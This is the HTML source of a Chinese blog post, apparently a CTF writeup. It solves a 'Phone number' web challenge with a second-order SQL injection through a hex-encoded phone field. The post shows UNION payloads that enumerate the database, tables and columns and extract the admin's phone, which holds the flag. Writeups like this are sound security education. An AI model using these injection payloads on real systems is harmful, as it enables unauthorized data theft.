@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>web 狗之writeup--phone</title>
+
+  
+  
+
+
+
+
+
+  
+  <meta name="author" content="Neal" />
+  <meta name="description" content="鄙人不才，只能做个 web 狗了。那就好好学习 web 吧。拼命地刷 writeup 就好了。上题目，Phone number。提示只有 phone number is a good thing.
+打开链接可以看到是一个登陆页面，查看源代码，没有什么东西。不过，这个页面还有个注册页面，注册页面有用户名密码以及 phone，查看其源代码也没有什么异常情况。这道题初步看来应该是一道 sql 注入题了，那么注入点在哪呢？当然是 phone 了（来自于上帝视角）。如果正经地来说还是因为题目的提示啦。
+注入点的确就是 phone，不过是要使用 16进制字符。为什么呢？上帝告诉我的，我也不知道。好吧，接下来就是 sql 注入四步曲了，爆数据库名，爆表名，爆字段，最后查数据，拿 flag。是不是很开心！
+正常用户 首先，我们首先注册一个正常用户，注册之后登录，可以看到页面。这里面有一个 check 的按钮，点击一下，可以看到页面提示 There only 369 people use the same phone as you。查看源代码，可以看到注释里面有一句话：听说admin的电话藏着大秘密哦，这也是一个小提示。这里面的369应该就是通过 sql 语句从数据库拿到的，语句可能就是类似于 select count(*) from user where phonenum = 12 这种的，从而查出和你电话号码一样的用户数了，那么我可以信誓旦旦地告诉你，这就是一个注入点啦！
+数据库名 因为 phone 可能使用的是数字，所以这是一个数字型的注入。那么，我买可以随便注册一个用户名了，首先获取数据库名的语句是 1 and 1 = 2 union select database()，把这个语句转化为16进制字符。将这个16进制字符串作为 phone 来进行注册，这里注意的一个点就是，前台对于 phone 的长度做了限制， maxlength=&amp;quot;11&amp;quot;，打开开发者工具设置大一点就可以了。注册成功之后，我么就可以看到：
+Hello, txt1 Your phone is 1 and 1 = 2 union select database()." />
+
+  
+  
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@gohugoio" />
+    <meta name="twitter:title" content="web 狗之writeup--phone" />
+    <meta name="twitter:description" content="鄙人不才，只能做个 web 狗了。那就好好学习 web 吧。拼命地刷 writeup 就好了。上题目，Phone number。提示只有 phone number is a good thing.
+打开链接可以看到是一个登陆页面，查看源代码，没有什么东西。不过，这个页面还有个注册页面，注册页面有用户名密码以及 phone，查看其源代码也没有什么异常情况。这道题初步看来应该是一道 sql 注入题了，那么注入点在哪呢？当然是 phone 了（来自于上帝视角）。如果正经地来说还是因为题目的提示啦。
+注入点的确就是 phone，不过是要使用 16进制字符。为什么呢？上帝告诉我的，我也不知道。好吧，接下来就是 sql 注入四步曲了，爆数据库名，爆表名，爆字段，最后查数据，拿 flag。是不是很开心！
+正常用户 首先，我们首先注册一个正常用户，注册之后登录，可以看到页面。这里面有一个 check 的按钮，点击一下，可以看到页面提示 There only 369 people use the same phone as you。查看源代码，可以看到注释里面有一句话：听说admin的电话藏着大秘密哦，这也是一个小提示。这里面的369应该就是通过 sql 语句从数据库拿到的，语句可能就是类似于 select count(*) from user where phonenum = 12 这种的，从而查出和你电话号码一样的用户数了，那么我可以信誓旦旦地告诉你，这就是一个注入点啦！
+数据库名 因为 phone 可能使用的是数字，所以这是一个数字型的注入。那么，我买可以随便注册一个用户名了，首先获取数据库名的语句是 1 and 1 = 2 union select database()，把这个语句转化为16进制字符。将这个16进制字符串作为 phone 来进行注册，这里注意的一个点就是，前台对于 phone 的长度做了限制， maxlength=&amp;quot;11&amp;quot;，打开开发者工具设置大一点就可以了。注册成功之后，我么就可以看到：
+Hello, txt1 Your phone is 1 and 1 = 2 union select database()." />
+    <meta name="twitter:image" content="https://madneal.com/img/avatar.jpg" />
+  
+
+  
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="web 狗之writeup--phone" />
+  <meta property="og:description" content="鄙人不才，只能做个 web 狗了。那就好好学习 web 吧。拼命地刷 writeup 就好了。上题目，Phone number。提示只有 phone number is a good thing.
+打开链接可以看到是一个登陆页面，查看源代码，没有什么东西。不过，这个页面还有个注册页面，注册页面有用户名密码以及 phone，查看其源代码也没有什么异常情况。这道题初步看来应该是一道 sql 注入题了，那么注入点在哪呢？当然是 phone 了（来自于上帝视角）。如果正经地来说还是因为题目的提示啦。
+注入点的确就是 phone，不过是要使用 16进制字符。为什么呢？上帝告诉我的，我也不知道。好吧，接下来就是 sql 注入四步曲了，爆数据库名，爆表名，爆字段，最后查数据，拿 flag。是不是很开心！
+正常用户 首先，我们首先注册一个正常用户，注册之后登录，可以看到页面。这里面有一个 check 的按钮，点击一下，可以看到页面提示 There only 369 people use the same phone as you。查看源代码，可以看到注释里面有一句话：听说admin的电话藏着大秘密哦，这也是一个小提示。这里面的369应该就是通过 sql 语句从数据库拿到的，语句可能就是类似于 select count(*) from user where phonenum = 12 这种的，从而查出和你电话号码一样的用户数了，那么我可以信誓旦旦地告诉你，这就是一个注入点啦！
+数据库名 因为 phone 可能使用的是数字，所以这是一个数字型的注入。那么，我买可以随便注册一个用户名了，首先获取数据库名的语句是 1 and 1 = 2 union select database()，把这个语句转化为16进制字符。将这个16进制字符串作为 phone 来进行注册，这里注意的一个点就是，前台对于 phone 的长度做了限制， maxlength=&amp;quot;11&amp;quot;，打开开发者工具设置大一点就可以了。注册成功之后，我么就可以看到：
+Hello, txt1 Your phone is 1 and 1 = 2 union select database()." />
+  <meta property="og:url" content="https://madneal.com/post/web%E7%8B%97%E4%B9%8Bwriteup--phone/" />
+  <meta property="og:image" content="https://madneal.com/img/avatar.jpg" />
+
+
+
+
+<meta name="generator" content="Hugo 0.37.1" />
+
+
+<link rel="canonical" href="https://madneal.com/post/web%E7%8B%97%E4%B9%8Bwriteup--phone/" />
+<link rel="alternative" href="https://madneal.com/index.xml" title="Neal&#39;s Blog" type="application/atom+xml" />
+
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+
+
+<meta name="robots" content="index,follow" />
+<meta name="referrer" content="origin-when-cross-origin" />
+<meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc" />
+<meta name="msvalidate.01" content="22596E34341DD1D17D6022C44647E587" />
+
+
+
+
+
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+<meta name="apple-mobile-web-app-title" content="Neal&#39;s Blog" />
+<meta name="msapplication-tooltip" content="Neal&#39;s Blog" />
+<meta name='msapplication-navbutton-color' content="#5fbf5e" />
+<meta name="msapplication-TileColor" content="#5fbf5e" />
+<meta name="msapplication-TileImage" content="/img/tile-image-windows.png" />
+<link rel="icon" href="https://madneal.com/img/favicon.ico" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://madneal.com/img/favicon-16x16.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://madneal.com/img/favicon-32x32.png" />
+<link rel="icon" sizes="192x192" href="https://madneal.com/img/touch-icon-android.png" />
+<link rel="apple-touch-icon" href="https://madneal.com/img/touch-icon-apple.png" />
+<link rel="mask-icon" href="https://madneal.com/img/safari-pinned-tab.svg" color="#5fbf5e" />
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/video.js/6.2.8/alt/video-js-cdn.min.css" />
+
+<link rel="stylesheet" href="https://madneal.com/css/bundle.css" />
+
+
+  
+  <!--[if lt IE 9]>
+    <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
+  <![endif]-->
+
+<!--[if lte IE 11]>
+    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
+  <![endif]-->
+
+
+<script src="//cdn.bootcss.com/object-fit-images/3.2.3/ofi.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/smooth-scroll/12.1.4/js/smooth-scroll.polyfills.min.js"></script>
+
+
+</head>
+  <body>
+    
+    <div class="suspension">
+      <a title="Go to top" class="to-top is-hide"><span class="icon icon-up"></span></a>
+      
+        
+        <a title="Go to comments" class="to-comment" href="#disqus_thread"><span class="icon icon-comment"></span></a>
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <img class="avatar" src="https://madneal.com/img/avatar.jpg" alt="Avatar">
+  
+  <h2 class="title">Neal&#39;s Blog</h2>
+  
+  <p class="subtitle">前端技术</p>
+  <button class="menu-toggle" type="button">
+    <span class="icon icon-menu"></span>
+  </button>
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+            
+            
+            
+              is-active
+            ">
+            <a href="https://madneal.com/">Home</a>
+          </li>
+      
+        <li class="menu-item
+            
+            
+            ">
+            <a href="https://github.com/neal1991">Works</a>
+          </li>
+      
+        <li class="menu-item
+            
+            
+            ">
+            <a href="https://madneal.com/tags/">Tags</a>
+          </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list">
+
+      
+      <li class="social-item">
+        <a href="mailto:bing.ecnu@gmail.com" title="Email"><span class="icon icon-email"></span></a>
+      </li>
+
+      
+      <li class="social-item">
+        <a href="//github.com/neal1991" title="GitHub"><span class="icon icon-github"></span></a>
+      </li>
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <li class="social-item">
+        <a href="https://madneal.com/index.xml"><span class="icon icon-rss" title="RSS"></span></a>
+      </li>
+
+    </ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">web 狗之writeup--phone</h1>
+      <p class="post-meta">@Neal · Aug 23, 2018 · 4 min read</p>
+    </header>
+    <article class="post-content">
+
+<p><img src="https://i.loli.net/2018/08/23/5b7eb1fbdb1b1.jpeg" alt="WechatIMG7.jpeg" /></p>
+
+<p>鄙人不才，只能做个 web 狗了。那就好好学习 web 吧。拼命地刷 writeup 就好了。上题目，<a href="http://106.75.72.168:3333/login.php">Phone number</a>。提示只有 phone number is a good thing.</p>
+
+<p>打开链接可以看到是一个登陆页面，查看源代码，没有什么东西。不过，这个页面还有个注册页面，注册页面有用户名密码以及 phone，查看其源代码也没有什么异常情况。这道题初步看来应该是一道 sql 注入题了，那么注入点在哪呢？当然是 phone 了（来自于上帝视角）。如果正经地来说还是因为题目的提示啦。</p>
+
+<p>注入点的确就是 phone，不过是要使用 16进制字符。为什么呢？上帝告诉我的，我也不知道。好吧，接下来就是 sql 注入四步曲了，爆数据库名，爆表名，爆字段，最后查数据，拿 flag。是不是很开心！</p>
+
+<h2 id="正常用户">正常用户</h2>
+
+<p>首先，我们首先注册一个正常用户，注册之后登录，可以看到页面。这里面有一个 check 的按钮，点击一下，可以看到页面提示 There only 369 people use the same phone as you。查看源代码，可以看到注释里面有一句话：听说admin的电话藏着大秘密哦，这也是一个小提示。这里面的369应该就是通过 sql 语句从数据库拿到的，语句可能就是类似于 <code>select count(*) from user where phonenum = 12</code> 这种的，从而查出和你电话号码一样的用户数了，那么我可以信誓旦旦地告诉你，这就是一个注入点啦！</p>
+
+<h2 id="数据库名">数据库名</h2>
+
+<p>因为 phone 可能使用的是数字，所以这是一个数字型的注入。那么，我买可以随便注册一个用户名了，首先获取数据库名的语句是 <code>1 and 1 = 2 union select database()</code>，把这个语句转化为16进制字符。将这个16进制字符串作为 phone 来进行注册，这里注意的一个点就是，前台对于 phone 的长度做了限制， <code>maxlength=&quot;11&quot;</code>，打开开发者工具设置大一点就可以了。注册成功之后，我么就可以看到：</p>
+
+<p>Hello, txt1
+Your phone is 1 and 1 = 2 union select database().
+Click on the link and you&rsquo;ll know how many people use the same phone as you.</p>
+
+<p>那么我们可以继续点击 check 按钮，页面显示</p>
+
+<p>There only 0 people use the same phone as you
+There only webdb people use the same phone as you</p>
+
+<p>这里的 webdb 很显然就是数据库名了。</p>
+
+<h2 id="表名">表名</h2>
+
+<p>接下来就是表名，这里比较麻烦的就是注入一次，就要注册一次，而且用户名不可以重复。算了，继续吧。构造查表名的语句：<code>1 union select table_name from information_schema.tables where table_schema = database()</code>,转化为16进制字符继续注册。再继续登录，点击 check:</p>
+
+<p>There only 29891 people use the same phone as you
+There only user people use the same phone as you</p>
+
+<p>现在可以看出表名就是 user 了。</p>
+
+<h2 id="字段名">字段名</h2>
+
+<p>同样的配方，还是同样的味道。查询语句：<code>1 union select column_name from information_schema.columns where table_name=&quot;user&quot;</code>，点击 check，就会显示出列名：</p>
+
+<p>There only 29893 people use the same phone as you
+There only Host people use the same phone as you
+There only User people use the same phone as you
+There only Password people use the same phone as you
+There only Select_priv people use the same phone as you
+There only Insert_priv people use the same phone as you
+There only Update_priv people use the same phone as you
+There only Delete_priv people use the same phone as you
+There only Create_priv people use the same phone as you
+There only Drop_priv people use the same phone as you
+There only Reload_priv people use the same phone as you
+There only Shutdown_priv people use the same phone as you
+There only Process_priv people use the same phone as you
+There only File_priv people use the same phone as you
+There only Grant_priv people use the same phone as you
+There only References_priv people use the same phone as you
+There only Index_priv people use the same phone as you
+There only Alter_priv people use the same phone as you
+There only Show_db_priv people use the same phone as you
+There only Super_priv people use the same phone as you
+There only Create_tmp_table_priv people use the same phone as you
+There only Lock_tables_priv people use the same phone as you
+There only Execute_priv people use the same phone as you
+There only Repl_slave_priv people use the same phone as you
+There only Repl_client_priv people use the same phone as you
+There only Create_view_priv people use the same phone as you
+There only Show_view_priv people use the same phone as you
+There only Create_routine_priv people use the same phone as you
+There only Alter_routine_priv people use the same phone as you
+There only Create_user_priv people use the same phone as you
+There only Event_priv people use the same phone as you
+There only Trigger_priv people use the same phone as you
+There only Create_tablespace_priv people use the same phone as you
+There only ssl_type people use the same phone as you
+There only ssl_cipher people use the same phone as you
+There only x509_issuer people use the same phone as you
+There only x509_subject people use the same phone as you
+There only max_questions people use the same phone as you
+There only max_updates people use the same phone as you
+There only max_connections people use the same phone as you
+There only max_user_connections people use the same phone as you
+There only plugin people use the same phone as you
+There only authentication_string people use the same phone as you
+There only id people use the same phone as you
+There only username people use the same phone as you
+There only phone people use the same phone as you</p>
+
+<p>可以看到已经出现很多列名了，我们可以看到一些比较关键的列名，比如 username 以及 phone。</p>
+
+<h2 id="flag">Flag</h2>
+
+<p>哈哈，最后一步了！Flag，马上就可以得到啦！由于之前的提示，我们可以知道 admin 的 phone 很重要，那么我们的语句就应该是，必须是：<code>1 union select phone from webdb.user where username = &quot;admin&quot;</code>，点击 check，显示：</p>
+
+<p>There only 29894 people use the same phone as you
+There only flag{6dd303b0-8fce-2396-9ad8-d9f7a72f84b0} people use the same phone as you
+There only 1555555 people use the same phone as you
+There only 15500956659 people use the same phone as you
+There only 1 people use the same phone as you
+There only 123456 people use the same phone as you
+There only 111111111111111 people use the same phone as you
+There only 11111111111 people use the same phone as you
+There only 12345678912 people use the same phone as you
+There only 111111 people use the same phone as you</p>
+
+<p>哈哈，常规套路，这个 wp 除了浏览器没有使用任何第三方工具即可完成，是不是很方便。不过我的 writeup 也是站在巨人的肩膀上完成的。</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="https://madneal.com/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="https://madneal.com/tags/web"><span class="tag">WEB</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.
+      </p>
+    </footer>
+    
+      <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "nealecnu" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+      
+    
+  </section>
+  <footer class="site-footer">
+  <p>© 2017-2018 Neal&#39;s Blog</p>
+  <p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+  
+</footer>
+
+
+
+<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>
+<script async src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    }
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+<script src="https://madneal.com/js/bundle.js"></script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-104405154-2', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+  </body>
+</html>
